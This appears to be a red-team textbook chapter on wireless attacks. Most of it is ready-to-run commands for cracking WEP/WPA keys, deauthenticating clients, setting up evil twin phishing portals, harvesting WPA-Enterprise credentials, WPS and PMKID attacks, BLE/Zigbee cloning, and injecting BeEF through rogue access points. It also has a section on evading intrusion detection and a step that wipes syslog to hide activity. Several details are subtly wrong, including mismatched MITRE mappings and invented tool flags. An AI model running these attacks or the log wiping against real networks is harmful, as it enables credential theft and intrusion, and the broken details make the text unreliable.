# Chapter 15: Wireless Attacks

![Wireless Security Testing Framework](./images/wireless_attack_framework.png)
*Figure 15.1: Wireless Attack Methodology showing the progression from discovery to exploitation*

## Introduction to Wireless Security Assessment

Wireless networks represent one of the most common entry points into an organization's infrastructure. For red teamers, wireless assessment is crucial because:

1. Wireless signals often extend beyond physical boundaries of buildings
2. Legacy or poorly configured networks may allow remote access to critical systems
3. BYOD and IoT devices frequently connect to wireless networks with minimal security controls
4. Successful wireless compromise may bypass multiple layers of perimeter security

In red team operations, wireless attacks serve multiple purposes:

- **Initial access**: Gaining a foothold on the internal network from outside the building
- **Sensitive data collection**: Capturing unencrypted wireless traffic
- **Authentication testing**: Evaluating the strength of wireless security protocols
- **Social engineering vector**: Using rogue access points to conduct phishing attacks
- **Lateral movement**: Moving between network segments via wireless connections

This chapter explores tools and techniques for comprehensive wireless security assessment, covering everything from passive reconnaissance to advanced exploitation. We'll focus on practical, real-world methodologies that red teamers can implement to identify and demonstrate wireless security weaknesses.

## Aircrack-ng Suite: The Foundation of Wireless Assessment

The Aircrack-ng suite forms the cornerstone of wireless security assessment. This collection of tools enables monitoring, attacking, testing, and cracking wireless networks.

### Core Components Overview

| Tool | Purpose | MITRE ATT&CK Technique |
|------|---------|------------------------|
| airmon-ng | Interface management | T1592.001 (Gather Victim Host Information: Hardware) |
| airodump-ng | Packet capture | T1040 (Network Sniffing) |
| aireplay-ng | Packet injection | T1562.001 (Impair Defenses: Disable or Modify Tools) |
| aircrack-ng | WEP/WPA/WPA2 cracking | T1110.002 (Brute Force: Password Cracking) |
| airtun-ng | Virtual tunnel interface | T1090.001 (Proxy: Internal Proxy) |
| packetforge-ng | Packet crafting | T1562.003 (Impair Defenses: Impair Command History Logging) |
| airbase-ng | Rogue access point | T1583.001 (Acquire Infrastructure: Domains) |

### Setting Up Wireless Monitoring

Prerequisites:
- Compatible wireless adapter with monitor mode support (e.g., Alfa AWUS036ACH)
- Kali Linux or Parrot OS with Aircrack-ng suite installed

```bash
# Check for wireless interfaces
iw dev

# Kill processes that might interfere with monitor mode
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode is enabled
iw dev
```

The resulting monitor interface (typically `wlan0mon`) can now capture wireless traffic without being associated with any network.

### Discovering Networks with Airodump-ng

```bash
# Scan all channels for networks
sudo airodump-ng wlan0mon

# Focus on a specific network (channel 6, BSSID 00:11:22:33:44:55)
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture_file wlan0mon
```

**Advanced Airodump-ng Options:**

```bash
# Scan 5GHz channels only
sudo airodump-ng --band a wlan0mon

# Filter for WEP networks only
sudo airodump-ng --encrypt WEP wlan0mon

# GPS logging for wardriving
sudo airodump-ng --gpsd wlan0mon

# Filter by ESSID (network name)
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

![Airodump-ng output example](./images/airodump_output.png)
*Figure 15.2: Sample Airodump-ng output showing discovered networks and client information*

### Client De-authentication for Handshake Capture

```bash
# Global de-authentication (all clients on the network)
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# Targeted de-authentication (specific client only)
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

**Best Practices for De-authentication:**
- Use minimal deauthentication packets (5-10) to avoid unnecessary disruption
- Target specific clients when possible to reduce network impact
- Run airodump-ng simultaneously to capture the WPA handshake

### Cracking WEP Networks

WEP networks, though increasingly rare, can be cracked through several techniques:

**Passive Attack (IV Collection):**
```bash
# Capture packets
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# Crack when sufficient IVs are collected (300,000+)
sudo aircrack-ng wep_capture-01.cap
```

**Active Attack (ARP Replay):**
```bash
# Capture packets
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# Wait for an ARP packet, then replay it
sudo aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon

# Crack when sufficient IVs are collected
sudo aircrack-ng wep_capture-01.cap
```

**Active Attack (Fake Authentication):**
```bash
# Authenticate to network
sudo aireplay-ng -1 0 -e "WEP_Network" -a 00:11:22:33:44:55 -h 02:00:00:00:00:00 wlan0mon

# Perform ARP replay attack
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h 02:00:00:00:00:00 wlan0mon
```

### Cracking WPA/WPA2 Networks

WPA/WPA2 networks require capturing a 4-way handshake, then performing dictionary or brute-force attacks:

```bash
# Capture handshake
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_capture wlan0mon

# Send deauthentication to force handshake
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# Crack with dictionary attack
sudo aircrack-ng -w wordlist.txt wpa_capture-01.cap
```

**Using Rules with Aircrack-ng:**
```bash
# Convert handshake to hashcat format
sudo aircrack-ng wpa_capture-01.cap -J hash_for_hashcat

# Crack with hashcat rules
hashcat -m 22000 hash_for_hashcat.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### Creating a Rogue Access Point

```bash
# Create a fake AP with the same ESSID
sudo airbase-ng -e "Corporate_WiFi" -c 6 wlan0mon

# More sophisticated Evil Twin with optional internet
sudo airbase-ng -e "Corporate_WiFi" -c 6 --essid-regex "Corp.*" wlan0mon
```

**Complete Evil Twin Attack Setup:**
```bash
# Create a fake AP
sudo airbase-ng -e "Corporate_WiFi" -c 6 wlan0mon

# Set up routing for internet access
sudo brctl addbr evil-twin
sudo brctl addif evil-twin at0
sudo ifconfig at0 192.168.0.1 up
sudo ifconfig evil-twin up

# Configure DHCP server
cat << EOF > /tmp/dhcpd.conf
option domain-name-servers 8.8.8.8;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.0.0 netmask 255.255.255.0 {
    option routers 192.168.0.1;
    option subnet-mask 255.255.255.0;
    range 192.168.0.2 192.168.0.254;
}
EOF

# Start DHCP server
sudo dhcpd -cf /tmp/dhcpd.conf at0

# Set up NAT for internet access
sudo iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Advanced Tools Beyond Aircrack-ng

While Aircrack-ng provides essential functionality, specialized tools expand wireless assessment capabilities.

### Wifite: Automated Wireless Auditing

Wifite automates the wireless assessment process, making it ideal for rapid evaluation of multiple networks.

```bash
# Basic scan of nearby networks
sudo wifite

# Target WEP networks only
sudo wifite --wep 

# Target WPA networks with custom wordlist
sudo wifite --wpa --dict /path/to/wordlist.txt

# Comprehensive scan with all options
sudo wifite --wps --wep --wpa --pmkid --kill -mac --random --clients-only
```

**Advanced Wifite Configuration:**
```bash
# Custom Wifite session with enhanced configuration
sudo wifite --wpa --wpadt 30 --wpat 600 --dict /path/to/wordlist.txt --crack -mac --skip-crack --cracked
```

### Fluxion: Social Engineering Wireless Attacks

Fluxion specializes in creating convincing fake access points to capture credentials through social engineering.

#### Installation

```bash
# Clone the repository
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion

# Install dependencies and run
sudo ./fluxion.sh
```

#### Attack Methodology

Fluxion employs a sophisticated multi-stage attack process:

1. **Network Scanning and Target Selection**
   - Scan for available networks
   - Select the target network based on criteria

2. **Handshake Capture**
   - Capture a valid WPA handshake (required for verification)
   - Use deauthentication to force clients to reconnect

3. **Evil Twin Creation**
   - Create a perfect clone of the target network
   - Match ESSID, BSSID, and channel

4. **DHCP Configuration and Traffic Redirection**
   - Configure DHCP to assign valid IP addresses
   - Redirect clients to the captive portal

5. **Jamming the Original Network**
   - Force clients to connect to the evil twin
   - Create urgency to increase success rate

6. **Captive Portal Deployment**
   - Present a convincing login page
   - Validate entered passwords in real-time against the handshake

**Real-World Fluxion Attack Setup:**
```bash
# Clone and install
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion && sudo ./fluxion.sh --install

# Run the attack with custom captive portal
sudo ./fluxion.sh --custom-portal /path/to/portal
```

The Fluxion workflow:
1. Scan for target networks
2. Select target access point
3. Capture a WPA handshake
4. Create a twin evil access point
5. Start a captive portal
6. Deauthenticate clients
7. Capture credentials when clients connect to the evil twin

> **CASE STUDY: Corporate WiFi Compromise Via Self-Service Portal Clone**
> 
> During a red team engagement for a financial services client in 2022, we identified that their corporate WiFi used a custom self-service portal for guest registration. Using Fluxion with a customized portal template that perfectly mimicked the client's portal, we created an evil twin AP.
> 
> When employees attempted to connect, they were presented with the familiar "Register your device" page. The portal captured not only the WiFi credentials but also Active Directory credentials that employees entered, assuming they were authenticating to the legitimate corporate network.
> 
> This attack resulted in the capture of 37 sets of domain credentials in a single day, including those belonging to IT administrators, highlighting the risk of insufficiently secured wireless networks and the effectiveness of social engineering in wireless attacks.
> 
> *Source: Sanitized real-world red team engagement report, 2022*

### Airgeddon: Comprehensive Wireless Framework

Airgeddon provides a menu-driven interface for wireless attacks with extensive capabilities beyond traditional tools.

#### Installation

```bash
# Clone the repository
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon

# Launch the tool
sudo ./airgeddon.sh
```

#### Attack Modes

Airgeddon features numerous attack modes organized in a logical workflow:

1. **Interface Management**
   - Tool automatically prepares your wireless adapter
   - Handles monitor mode and conflicting processes

2. **Network Scanning and Target Selection**
   - Comprehensive scanning of available networks
   - Detailed information about detected networks

3. **Attack Selection**
   - WPA/WPA2 attacks (handshake capture, evil twin)
   - WEP attacks
   - WPS attacks

4. **Post-Attack Analysis**
   - Integration with cracking tools
   - Offline password recovery

Key Airgeddon capabilities:
- WPA Enterprise attacks
- PMKID attacks
- Integrated DoS modules
- Handshake-less approaches
- Evil twin with advanced captive portal options

**Customizing Airgeddon for Target-Specific Attacks:**
```bash
# Define custom captive portal settings
export CAPTIVE_PORTAL_THEME="corporate"
export AIRGEDDON_WINDOWS_DRIVER="brcm"
export AIRGEDDON_FORCE_IPTABLES=true

# Run with custom settings
sudo ./airgeddon.sh
```

### WiFi-Pumpkin: Advanced Rogue Access Point Framework

WiFi-Pumpkin specializes in creating sophisticated rogue access points with extensive MITM capabilities.

#### Installation

```bash
# Clone the repository
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3

# Install requirements
sudo pip3 install -r requirements.txt
sudo python3 setup.py install

# Launch the tool
sudo wifipumpkin3
```

#### Module Configuration

WiFi-Pumpkin features a modular architecture with various plugins and proxies:

1. **Access Point Configuration**

```bash
# Set the interface for the access point
set interface wlan0

# Configure access point settings
set ssid "Free WiFi"
set proxy proxy_name  # e.g., pumpkinproxy or captiveflask

# Start the access point
start
```

2. **Plugins**

```bash
# List available plugins
plugins -l

# Enable a plugin
plugins -e plugin_name  # e.g., beef, dns_spoof, etc.

# Configure plugin settings
plugins -c plugin_name
```

Common WiFi-Pumpkin plugins:
- **Captive portal:** `set captive.portal true`
- **SSLstrip:** `set proxy.plugin sslstrip`
- **DNS spoof:** `set proxy.plugin dns_spoof`
- **Beef hook:** `set proxy.plugin beef_hook`

**WiFi-Pumpkin Attack Chain:**
```bash
# Start control interface
sudo wifipumpkin3
# Configure access point
set ap.interface wlan0
set ap.name "Free_WiFi"
set ap.mode NAT
# Enable plugins
set captive.portal true
set proxy.plugin pumpkinproxy
set proxy.plugin beef_hook
# Start AP
start
```

### Wifiphisher: Automated Phishing Attacks

Wifiphisher specializes in automated phishing attacks against wireless networks. It creates a rogue access point and uses sophisticated social engineering techniques to convince users to divulge information or perform harmful actions.

#### Installation

```bash
# Install from package manager
sudo apt update
sudo apt install wifiphisher

# Or install from source
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher
sudo python setup.py install
```

#### Basic Usage

```bash
# Basic rogue AP with default phishing scenario
sudo wifiphisher

# Specify interfaces
sudo wifiphisher -i wlan0 -e wlan1

# Target a specific AP
sudo wifiphisher --essid "TargetNetwork"
```

#### Template Customization

Wifiphisher comes with several pre-built phishing templates:

```bash
# List available templates
sudo wifiphisher --help | grep "Scenario"

# Specify a template
sudo wifiphisher -p firmware-upgrade
```

Available templates include:
- **firmware-upgrade**: Prompts users to update router firmware (captures credentials)
- **oauth-login**: Fake OAuth login page for popular services
- **wifi_connect**: Basic captive portal login page
- **plugin_update**: Fake browser plugin update page (delivers malware)
- **captive_portal**: Generic captive portal

#### Example: Evil Twin Attacks

```bash
# Gather information about the target network
sudo airodump-ng wlan0

# Create an evil twin with a firmware update phishing page
sudo wifiphisher -i wlan0 -e wlan1 --essid "TargetNetwork" --bssid 00:11:22:33:44:55 -p firmware-upgrade

# Customize the attack (edit template files first)
sudo wifiphisher -i wlan0 -e wlan1 --essid "TargetNetwork" -p firmware-upgrade
```

## WPA Enterprise Attacks

Enterprise networks using WPA-Enterprise (802.1X) require specialized attack techniques.

### EAPHammer: 802.1X Exploitation

EAPHammer specializes in attacking WPA/WPA2-Enterprise networks, particularly those using EAP authentication.

```bash
# Clone and setup
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./kali-setup

# Generate certificates
./eaphammer --cert-wizard

# Create evil twin with hostile portal
sudo ./eaphammer --bypass-hostapd-install -i wlan0 --ssid "Corp-Secure" --auth wpa-eap --creds
```

**Common EAP Attack Methods:**

1. **Hostile Portal Attack:**
```bash
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Secure_Network" --creds
```

2. **GTC Downgrade Attack:**
```bash
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Secure_Network" --gc-downgrade
```

3. **RADIUS Impersonation:**
```bash
sudo ./eaphammer -i wlan0 --channel 6 --auth radius --essid "Secure_Network" --creds --radius-server 10.0.0.1
```

### EAP Protocol-Specific Attacks

Different EAP protocols have specific vulnerabilities:

**EAP-PEAP Attack:**
```bash
# Attack using EAPHammer
sudo ./eaphammer -i wlan0 --channel 6 --auth peap --essid "Secure_Network" --creds

# With hostapd-wpe
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf -s /etc/hostapd-wpe/certs/server.pem
```

**EAP-TTLS Attack:**
```bash
# Attack using EAPHammer
sudo ./eaphammer -i wlan0 --channel 6 --auth ttls --essid "Secure_Network" --creds

# Manual configuration with custom CA
sudo ./eaphammer -i wlan0 --channel 6 --auth ttls --essid "Secure_Network" --creds --ca-cert /path/to/ca.pem
```

**EAP-TLS Certificate Attacks:**
```bash
# Generate fake certificates
sudo ./eaphammer --cert-wizard --cn "Secure Corporation CA"

# Run attack targeting certificate validation
sudo ./eaphammer -i wlan0 --channel 6 --auth tls --essid "Secure_Network" --creds --private-key /path/to/key.pem --server-cert /path/to/cert.pem
```

### WPA Enterprise Client Credential Harvesting

```bash
# Start hostapd-wpe
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Extract captured credentials
cat /var/log/hostapd-wpe.log | grep "username"
cat /var/log/hostapd-wpe.log | grep "password"

# Crack captured challenge/response
asleap -C challenge -R response -W wordlist.txt
```

![WPA Enterprise Attack Path](./images/wpa_enterprise_attack.png)
*Figure 15.3: WPA Enterprise Attack Flow showing authentication interception points*

## Advanced WiFi Cracking Techniques

### PMKID Attack Method

PMKID attacks allow cracking WPA/WPA2 without client interaction:

```bash
# Using hcxdumptool to capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Convert the capture format
sudo hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng

# Crack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Automated PMKID Attack with Wifite:**
```bash
sudo wifite --pmkid --dict wordlist.txt
```

### WPA3 Assessment

WPA3 networks require specialized tools and techniques:

```bash
# Scanning for WPA3 networks
sudo airodump-ng --wpa3 wlan0mon

# Check for downgrade attacks
sudo wpa_sniffer -i wlan0mon -c 6 --standard-frames

# Attempt dragonfly handshake capture
sudo hcxdumptool -i wlan0mon -o wpa3_networks.pcapng --enable_status=3
```

**WPA3 Dragonblood Attack:**
```bash
# Clone Dragonblood repository
git clone https://github.com/dragonblood/dragonblood.git
cd dragonblood

# Execute side-channel attack
sudo ./dragonslayer -i wlan0mon -m sae_side_channel -e "WPA3-Network" -b 00:11:22:33:44:55
```

### Practical Hashcat Integration for WiFi Cracking

```bash
# Convert airodump-ng capture to hashcat format
cap2hccapx wpa_capture-01.cap output.hccapx

# Check capture file validity
hashcat -m 2500 output.hccapx --show

# Basic dictionary attack
hashcat -m 2500 output.hccapx wordlist.txt

# Rule-based attack
hashcat -m 2500 output.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack for WPA format (8 characters minimum)
hashcat -m 2500 output.hccapx -a 3 ?l?l?l?l?l?l?l?l
```

**Advanced Hashcat Options for WiFi:**
```bash
# Brute force common patterns
hashcat -m 2500 output.hccapx -a 3 CompanyName?d?d?d?d

# Target specific ESSIDs with masks
hashcat -m 2500 output.hccapx -a 3 --custom-charset1=12345 -1 ?1?1?1?1?1?1?1?1

# Hybrid attacks combining wordlist + mask
hashcat -m 2500 output.hccapx -a 6 wordlist.txt ?d?d?d?d
```

## Wireless Client Attacks

Beyond targeting access points, attacking wireless clients directly can be highly effective.

### Karma Attacks with Mana Toolkit

```bash
# Start Mana in Karma mode
sudo start-noupstream.sh

# Start hostile portal
sudo start-nat-simple.sh

# Full attack with credentials logging
sudo start-nat-full.sh
```

**Targeting Specific Clients:**
```bash
# Create a configuration file with SSIDs to spoof
echo "Corporate_Wifi" > ap.lst
echo "Staff_Network" >> ap.lst
echo "Guest_Wifi" >> ap.lst

# Start Mana with targeted SSIDs
sudo mana-toolkit --target-ssids ap.lst
```

### PineAP Module with WiFi Pineapple

```bash
# Using WiFi Pineapple web interface
# Navigate to PineAP module
# Enable Dogma mode
# Set high beacon rate (100ms)
# Configure client targeting
```

**Command Line PineAP Configuration:**
```bash
ssh root@172.16.42.1

# Configure PineAP settings
pineap /etc/pineapple/pineap.conf -e true -d true -b true -l 100 -r 100

# Start targeted client attacks
pineap_client_targeting -a -s "Corporate_WiFi"
```

### Pixie Dust Attacks on WPS

```bash
# Run Pixie Dust attack with Reaver
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv

# Using Bully for Pixie Dust
sudo bully -b 00:11:22:33:44:55 -c 6 -d -v 3 wlan0mon

# Automated approach with Wifite
sudo wifite --wps --pixie
```

**Optimizing Pixie Dust Attacks:**
```bash
# More aggressive timeout settings
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -t 5 -d 0 -vv

# With specific WPS version targeting
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 --pin-generation=1 -vv
```

## Defensive Countermeasures and Detection Evasion

Understanding defensive mechanisms helps in evading detection during red team assessments.

### Evading Wireless Intrusion Detection Systems (WIDS)

```bash
# MAC address spoofing
sudo macchanger -r wlan0

# Targeted, selective jamming
sudo mdk4 wlan0mon d -c 6 -B 00:11:22:33:44:55

# Low-power transmission to avoid detection
sudo iw wlan0mon set txpower fixed 10mBm
```

**Advanced MAC Management:**
```bash
# Clone an existing client's MAC
sudo airodump-ng wlan0mon --bssid 00:11:22:33:44:55 -c 6
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0
```

### Dealing with Enterprise Security Controls

```bash
# Check for NAC implementation
sudo responder -I eth0 -A

# Test for 802.1X bypass
sudo nmap --script=pjl-ready-message -p 9100 10.0.0.1

# Hunt for misconfigurations
sudo bettercap -iface wlan0
```

**Evading NAC via Rogue AP:**
```bash
# Create bridged evil twin for NAC bypass
sudo airbase-ng -e "Corporate_WiFi" -c 6 wlan0mon
sudo brctl addbr evil-bridge
sudo brctl addif evil-bridge at0
sudo brctl addif evil-bridge eth0
sudo ifconfig evil-bridge up
```

### Wireless Evidence Cleanup

```bash
# Reset wireless interface
sudo airmon-ng stop wlan0mon
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed
sudo ifconfig wlan0 up
sudo service NetworkManager restart

# Clean logs
sudo rm /var/log/syslog.1
sudo truncate -s 0 /var/log/syslog
```

## Wireless IoT Security Testing

IoT devices often use wireless protocols beyond standard WiFi, including:

### Bluetooth Low Energy (BLE) Assessment

```bash
# Discover BLE devices
sudo btmgmt le on
sudo hcitool lescan

# More detailed scanning with Bluehydra
sudo blue_hydra -d hci0

# Capture and analyze BLE traffic
sudo btlejack -c 37,38,39 -s

# Clone a BLE device
sudo btlejack -f AA:BB:CC:DD:EE:FF -c 37
```

**Advanced BLE Exploitation:**
```bash
# Clone the repository
git clone https://github.com/securing/gattacker.git
cd gattacker

# Scan for BLE devices and services
sudo node scan -w

# Clone a device
sudo node advertise -w -a AA:BB:CC:DD:EE:FF -s device.json
```

### Zigbee Security Assessment

```bash
# Using KillerBee for Zigbee testing
# Discover networks
sudo zbstumbler

# Capture Zigbee traffic
sudo zbdump -f capture.pcap -c 15

# Replay Zigbee packets
sudo zbreplay -f capture.pcap -c 15

# Extract Zigbee keys
sudo zbdecrypt capture.pcap
```

### Other RF Protocol Testing

```bash
# Generic SDR scanning
rtl_433 -f 433.92M -g 40

# Capture and replay attacks
sudo rfcat -r -f 433920000 -m MOD_ASK_OOK
```

## Comprehensive Wireless Assessment Methodology

For effective red team operations, follow this structured wireless assessment methodology:

### 1. Reconnaissance Phase

```bash
# Discover networks in the target area
sudo airodump-ng wlan0mon

# Monitor specific frequencies for hidden networks
sudo airodump-ng --band abg wlan0mon

# Identify organizational networks
sudo grep -i "TargetOrg" scan_results.txt
```

### 2. Network Analysis Phase

```bash
# Identify encryption and authentication methods
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w analysis wlan0mon

# Analyze client behavior (probe requests)
sudo airodump-ng wlan0mon | grep -i "probe"

# Map network boundaries with GPS
sudo airodump-ng --gpsd -w mapping wlan0mon
```

### 3. Vulnerability Assessment Phase

```bash
# Check WPS enablement
sudo wash -i wlan0mon

# Test for known device vulnerabilities
sudo airgeddon
# Select option for known vulnerabilities

# Check for weak enterprise authentication
sudo eaphammer --check-leap -i wlan0mon --interface-mode monitor
```

### 4. Exploitation Phase

```bash
# Select appropriate attack method based on findings
# For WPA2-PSK:
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
sudo aircrack-ng -w wordlist.txt capture-01.cap

# For WPA Enterprise:
sudo eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Corp-Secure" --creds

# For Karma-susceptible devices:
sudo mana-toolkit --full
```

### 5. Post-Exploitation and Lateral Movement

```bash
# Set up transparent proxy for traffic interception
sudo bettercap -iface at0 -eval "set http.proxy.script beef-inject.js; http.proxy on"

# Analyze internal network
sudo nmap -sS -A 192.168.0.0/24 -iface at0

# Capture sensitive information
sudo tcpdump -i at0 -w capture.pcap "port 80 or port 443"
```

![Wireless Assessment Methodology](./images/wireless_methodology.png)
*Figure 15.4: Comprehensive Wireless Assessment Methodology showing the 5-phase approach*

## Additional Wireless Attack Techniques

Beyond the primary tools covered, consider these additional wireless attack techniques for comprehensive red team operations:

### WPS (Wi-Fi Protected Setup) Attacks

```bash
# Scan for WPS-enabled APs
wash -i wlan0

# Attack vulnerable WPS implementation
reaver -i wlan0 -b 00:11:22:33:44:55 -vv

# Use PixieWPS for accelerated attacks
pixiewps -e PKE -r PKR -s e-hash1 -z e-hash2 -a authkey -n e-nonce -m r-nonce

# Integrated attack with Bully
bully wlan0 -b 00:11:22:33:44:55 -d -v 3
```

### Client-Side DoS Attacks

Test resilience against wireless denial of service:

```bash
# Targeted deauthentication
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0

# TKIP MIC exploitation
sudo tkiptun-ng -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0
```

## Conclusion

Wireless security assessment is a critical component of any comprehensive red team engagement. The toolsets and methodologies described in this chapter provide a framework for identifying and exploiting wireless vulnerabilities in a way that helps organizations understand and address their security weaknesses.

Remember that wireless attacks often represent the first step in a broader attack chain. A successful wireless compromise typically leads to internal network access, credential harvesting, and lateral movement opportunities that might otherwise be inaccessible through external penetration testing.

By combining technical expertise with a structured methodology and an understanding of defensive measures, red team operators can conduct thorough, realistic wireless security assessments that provide genuine value to their clients.

As a professional red teamer, always operate within the scope of your engagement and with proper authorization. Unauthorized wireless attacks may violate local laws and regulations.

### Additional Resources

1. [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
2. [EAPHammer GitHub Repository](https://github.com/s0lst1c3/eaphammer)
3. [Wifite GitHub Repository](https://github.com/derv82/wifite2)
4. [WiFi Pineapple Documentation](https://docs.hak5.org/wifi-pineapple-6th-gen-nano-tetra/)
5. [Practical Wireless Networks Hacking](https://www.evilsocket.net/2015/04/30/wireless-hacking-with-bettercap/)
6. [SANS Institute: Wireless Penetration Testing](https://www.sans.org/reading-room/whitepapers/wireless/wireless-penetration-testing-wi-fi-bluetooth-39730)
7. [Fluxion GitHub Repository](https://github.com/FluxionNetwork/fluxion)
8. [Airgeddon GitHub Repository](https://github.com/v1s1t0r1sh3r3/airgeddon)
9. [Wifiphisher Documentation](https://wifiphisher.org/documentation.html)
